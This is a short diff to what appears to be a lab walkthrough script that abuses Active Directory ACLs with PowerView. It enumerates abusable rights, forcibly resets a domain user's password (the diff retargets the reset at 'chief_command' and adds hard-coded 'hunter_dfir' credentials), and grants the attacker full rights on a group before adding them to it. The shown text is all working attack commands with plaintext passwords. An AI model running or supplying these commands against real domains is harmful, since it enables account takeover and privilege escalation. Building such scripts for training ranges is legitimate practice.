@@ -9,7 +9,7 @@ step "Enumerate interesting ACLs we can abuse (PowerView)"
 run_cmd ". .\powerview.ps1; Find-InterestingDomainAcl -ResolveGUIDs | ? {`$_.IdentityReferenceName -match 'Cadre'} | Select IdentityReferenceName,ActiveDirectoryRights,ObjectDN"
 
 step "WT#015 ForceChangePassword: reset a target user's password"
-run_cmd "Set-DomainUserPassword -Identity analyst_dfir -AccountPassword (ConvertTo-SecureString 'N3wP@ss!' -AsPlainText -Force)"
+run_cmd "Set-DomainUserPassword -Identity chief_command -AccountPassword (ConvertTo-SecureString 'N3wP@ss!' -AsPlainText -Force) -Credential (New-Object System.Management.Automation.PSCredential('hunter_dfir',(ConvertTo-SecureString 'DF1R_Hunt3r!' -AsPlainText -Force)))"
 
 step "WT#013/014 WriteDacl/GenericWrite: grant ourselves rights, then add to a privileged group"
 run_cmd "Add-DomainObjectAcl -TargetIdentity 'DFIR-Cadre' -PrincipalIdentity $ATTACK_USER -Rights All"
